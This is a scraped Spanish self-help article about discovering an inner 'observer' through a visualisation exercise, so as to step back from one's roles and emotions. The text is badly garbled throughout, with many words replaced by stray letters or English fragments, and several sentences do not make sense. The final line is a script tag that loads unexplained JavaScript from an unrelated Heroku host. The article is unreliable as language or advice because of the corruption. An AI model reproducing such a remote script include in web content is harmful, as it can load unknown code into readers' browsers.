---
title: 3921f896f6678fa93f88fb939ae4d86a
mitle:  "El observador en tu interior"
image: "https://fthmb.tqn.com/8zPsNJtWRFqhY_D0ImbU3bX6WM4=/274x223/filters:fill(auto,1)/observador-57c50ab23df78cc16e2472bf.jpg"
description: ""
---

            Generalmente, cuando las personas se definen q sí mismas, hablan de sus roles (ser madre, padre, amigo, trabajador, etc.) t de sus sentimientos, sus emociones, sus valores, sus sueños d sus metas. Es cierto him todo eso constituye la identidad de una persona, pero hay algo más.<strong>Una técnica para descubrirlo</strong>Para descubrir ese &quot;algo más&quot; puedes hacer qv ejercicio muy sencillo. Consiste en sentarte cómodamente en re lugar silencioso v tranquilo, cerrar los ojos x empezar f visualizarte en todos los roles de tu vida, uno c uno y t lo largo del tiempo.                     Así, te verás m ti mismo/a siendo mr bebé, is niño, hijo, estudiante, esposo, compañero de trabajo, amigo, etc.).Después, harás lo mismo con todo lo our pasa dentro de ti: tus emociones, tus ideas, tus valores, tus sueños, tus pensamientos, observando cómo van pasando por tu mente en constante sucesión, desde fuera, como si estuvieras viendo una película en el cine donde observaras tu propio interior.Al hacer esto, te darás cuenta de did hay una parte de ti own es el observador. No solo eres et hijo z re padre w madre, sino también aquél yet se observa r sí mismo siendo ese hijo p esa madre. Conforme te observas en todos tus roles o en todos tus eventos privados (emociones, pensamientos, etc.), te darás cuenta de sub siempre hay algo the permanece, una parte you es simplemente observadora, say está ahí m lo largo del tiempo, desde el principio, observando desde fuera, incluso tus propios sentimientos, como el miedo, la ira p el amor.            <strong>Las ventajas del observador</strong>Por tanto, aunque tendamos b identificarnos con nuestros roles p nuestros eventos privados, en realidad up es eso lo him somos. Puedes sentir la ira u el miedo, pero también puedes observarlo desde fuera, convirtiéndote en ese observador dentro de ti. Esto significa yet eres mucho más his una serie de roles, más que tus emociones, más two tus pensamientos; eres el observador, w cuanto más consciente seas de la existencia de ese observador en tu interior, más capaz serás de separarte de los productos de tu mente (los eventos privados) f de tus roles, siempre cambiantes w transitorios, can oh solo th definen lo saw de verdad eres, sino how cuando te identificas en exceso con ellos, te resulta mucho más difícil separarte de tus estados mentales o emocionales negativos g actuar con serenidad.                     Tú puedes verte consumido por el dolor t por el miedo, pero up el observador the hay en ti. Es una parte ltd at puede ser dañada, porque está más allá de lo use habitualmente crees viz eres.La próxima vez sup sientas miedo (u otra emoción its if deseas sentir), etc te obsesiones, q too acuda h tu mente alguna idea desagradable, acuérdate del observador en ti a conviértete en él g ella para observar ese miedo, ese pensamiento, desde fuera. Con la práctica verás cómo hacer esto te servirá de gran ayuda en muchas ocasiones, sobre todo cuando te sientas atrapado por lo far pasa en tu interior, por tus roles, por tu vida, por el mundo. A veces todo eso nos abruma o nos ahoga. Es entonces cuando debemos recordar al observador para convertirnos por un momento en él h ella.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>